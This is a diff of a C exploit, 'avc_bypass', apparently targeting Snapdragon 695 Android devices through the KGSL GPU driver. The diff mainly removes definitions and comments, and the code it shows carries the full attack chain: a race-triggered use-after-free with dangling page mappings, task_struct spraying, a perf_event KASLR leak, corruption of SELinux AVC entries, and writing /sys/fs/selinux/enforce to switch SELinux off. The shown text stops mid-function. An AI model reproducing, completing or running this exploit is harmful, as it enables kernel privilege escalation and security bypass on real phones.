@@ -1,5 +1,3 @@
-
-
 #include "avc_bypass.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -25,69 +23,7 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/sysmacros.h>
-
-#define KGSL_IOC_TYPE 0x09
-
-struct kgsl_gpuobj_alloc {
-    uint64_t size; uint64_t flags; uint64_t va_len;
-    uint64_t mmapsize; unsigned int id;
-    unsigned int metadata_len; uint64_t metadata;
-};
-#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
-
-struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
-#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
-
-struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
-
-struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)
-
-struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };
-
-struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
-#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
-
-struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };
-
-struct kgsl_gpu_command {
-    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
-    uint64_t objlist; unsigned int objsize, numobjs;
-    uint64_t synclist; unsigned int syncsize, numsyncs;
-    unsigned int context_id, timestamp;
-};
-#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
-
-struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
-#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
-
-#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
-#define KGSL_CACHEMODE_SHIFT 0
-#define KGSL_CACHEMODE_MASK 3
-#define KGSL_CACHEMODE_WRITEBACK 3
-#define KGSL_USER_MEM_TYPE_ADDR 2
-#define KGSL_CONTEXT_PREAMBLE 0x00000010
-#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
-#define KGSL_CMDLIST_IB 0x00000001U
-#define KGSL_TIMESTAMP_RETIRED 0x00000002
-
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL
-#define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
-
-#define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
-#define AVC_NODE_STRIDE  72
-#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
-#define AVC_PAGES_PER_IB 12
-#define AVC_LOOP_SECONDS 150
-#define SPRAY_PIDS 2000
-#define CHURN_MAX_PATHS 20000
+#include <sys/stat.h>
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
@@ -97,7 +33,6 @@ static void *uaf_map = NULL;
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
-/* ========== PM4 ========== */
 static uint32_t pm4_parity(uint32_t v) {
     return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
@@ -111,7 +46,6 @@ static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
     *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
 }
 
-/* ========== KGSL 基本操作 ========== */
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
@@ -162,17 +96,6 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ========== レース（IMPORT不使用） ========== */
-static void *race_thread_allocfree(void *arg) {
-    while (!race_done) {
-        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
-        if (id >= 0) gpuobj_free(id);
-        usleep(50);
-    }
-    return NULL;
-}
-
-/* ========== フェーズ1: rbtree setup ========== */
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
@@ -192,7 +115,15 @@ static void phase1_rbtree(void) {
         (unsigned long)PLACEHOLDER_ADDR);
 }
 
-/* ========== フェーズ2: レース（オーバーラップ mmap を成功させる） ========== */
+static void *race_thread_allocfree(void *arg) {
+    while (!race_done) {
+        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
+        if (id >= 0) gpuobj_free(id);
+        usleep(50);
+    }
+    return NULL;
+}
+
 static int phase2_race(void) {
     int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
     pthread_t thr;
@@ -216,13 +147,11 @@ static int phase2_race(void) {
     return 1;
 }
 
-/* ========== フェーズ3: UAF解放 ========== */
 static void phase3_free_uaf(void) {
     gpuobj_free(uaf_id);
     printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
 }
 
-/* ========== フェーズ4: メモリ回収 ========== */
 static void phase4_reclaim(void) {
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
@@ -231,7 +160,6 @@ static void phase4_reclaim(void) {
     usleep(10000);
 }
 
-/* ========== チャーン ========== */
 static const char *churn_dirs[] = {
     "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
     "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
@@ -291,7 +219,6 @@ static void churn_round(void) {
     mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
 }
 
-/* ========== AVCエントリ数 ========== */
 static int avc_entries(void) {
     int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
     if (fd < 0) return -1;
@@ -305,7 +232,6 @@ static int avc_entries(void) {
     return e;
 }
 
-/* ========== setenforce 0 ========== */
 static int try_setenforce0(void) {
     int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
     if (fd < 0) return 0;
@@ -314,7 +240,6 @@ static int try_setenforce0(void) {
     return (w == 1);
 }
 
-/* ========== スプレー ========== */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 static void spawn_spray(void) {
@@ -340,9 +265,7 @@ static void kill_spray_children(void) {
     printf("[KILL] %d spray children killed+reaped\n", killed);
 }
 
-/* ========== CPU読み出し代替: prescan_task_pages ========== */
-static int prescan_task_pages_cpu(uint64_t scan_start, uint64_t end_va,
-                                  uint64_t *out_vas, int maxout) {
+static int prescan_task_pages_cpu(uint64_t scan_start, uint64_t end_va, uint64_t *out_vas, int maxout) {
     uint32_t *p = (uint32_t *)uaf_map;
     uint64_t offset = scan_start - UAF_ADDR;
     uint32_t *start_ptr = (uint32_t *)((uintptr_t)uaf_map + offset);
@@ -359,7 +282,6 @@ static int prescan_task_pages_cpu(uint64_t scan_start, uint64_t end_va,
     return n;
 }
 
-/* ========== CPU読み出し代替: scan_flip_pages ========== */
 static int scan_flip_pages_cpu(uint64_t *vas, int npages) {
     int total_flips = 0;
     for (int idx = 0; idx < npages; idx++) {
@@ -381,7 +303,6 @@ static int scan_flip_pages_cpu(uint64_t *vas, int npages) {
     return total_flips;
 }
 
-/* ========== KASLR ========== */
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
@@ -430,58 +351,47 @@ static uint64_t detect_kaslr(void) {
     return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
 }
 
-/* ========== メイン ========== */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] avc_bypass (Snapdragon 695) - UAF + CPU代替読み出し\n");
+    printf("[*] avc_bypass for Snapdragon 695 - UAF + CPU replace read\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    /* KASLR (init_cred は参考) */
     uint64_t kaslr = detect_kaslr();
     if (!kaslr) { printf("[-] KASLR detection failed\n"); close(kgsl_fd); return 1; }
     printf("[+] KASLR = 0x%lx\n", kaslr);
     uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
     printf("[*] init_cred = 0x%lx (reference only)\n", init_cred_addr);
 
-    /* Phase 1: rbtree setup */
     printf("[*] Phase 1: Setup rbtree\n");
     phase1_rbtree();
 
-    /* Phase 2: Race */
     printf("[*] Phase 2: Race (alloc/free contention)\n");
     if (!phase2_race()) { close(kgsl_fd); return 1; }
 
-    /* Phase 3: Free UAF */
     printf("[*] Phase 3: Free UAF\n");
     phase3_free_uaf();
 
-    /* Phase 4: Reclaim */
     printf("[*] Phase 4: Reclaim\n");
     phase4_reclaim();
 
-    /* Phase 5: Spray task_struct */
     spawn_spray();
 
-    /* Phase 6: Scan task pages via CPU mapping */
     printf("[*] Phase 6: Scan task pages (CPU)\n");
     uint64_t task_pgs[4096];
     int n_task_pgs = prescan_task_pages_cpu(UAF_ADDR + 0x2000,
         UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
     printf("[*] pre-scan: %d task pages\n", n_task_pgs);
 
-    /* Phase 7: Kill spray children */
     kill_spray_children();
     usleep(100000);
 
-    /* Phase 8: Churn */
     churn_build();
     for (int c = 0; c < 3; c++) churn_round();
     printf("[AVC] entries=%d (post-churn)\n", avc_entries());
 
-    /* Phase 9: Flip AVC nodes via CPU mapping */
     int flip_total = 0;
     int ok = 0;
     uint64_t t_start = time(NULL);
